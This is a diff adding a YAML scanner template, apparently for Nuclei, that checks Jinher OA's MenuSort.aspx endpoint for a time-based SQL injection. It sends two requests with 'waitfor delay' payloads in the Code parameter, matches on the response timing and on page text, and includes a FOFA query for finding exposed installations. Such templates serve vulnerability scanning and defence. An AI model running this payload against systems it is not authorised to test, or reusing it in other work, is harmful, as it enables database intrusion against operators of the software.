@@ -1,0 +1,37 @@
+id: poc-yaml-jinher-menusort-aspx-sqli
+info:
+  name: "金和OA MenuSort.aspx 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  metadata:
+    fingerprint: 金和OA
+    fofa-query: "app=\"金和网络-金和OA\""
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/MenuSort.aspx/?Code=1'waitfor+delay'0:0:5'--&level=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/MenuSort.aspx/?Code=1'waitfor+delay'0:0:8'--&level=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1级菜单排序"
+          - "菜单名称"
+          - "排序"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
